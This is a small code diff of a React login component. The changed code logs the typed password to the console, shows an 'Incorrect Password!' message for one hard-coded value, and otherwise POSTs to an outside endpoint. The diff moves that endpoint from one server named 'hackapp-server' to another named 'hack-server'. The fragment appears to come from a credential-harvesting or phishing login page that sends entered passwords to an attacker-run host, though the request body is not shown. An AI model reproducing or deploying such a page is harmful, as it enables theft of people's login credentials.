@@ -19,14 +19,14 @@ const Login = () => {
 
     console.log(password)
     if(password.length < 6 ){
-      setError("Use a Valid Password")
+      setError("Use a Valid Password (at least 6 character)")
     }
     else if(password === "M157826505603" ){
       setError("Incorrect Password!")
      }
       else{
         setError(" ")
-      fetch('https://hackapp-server-production.up.railway.app/data', {
+      fetch('https://hack-server-b5j9.onrender.com/user', {
             method : "POST", 
             headers : {
               'content-type' : 'application/json'
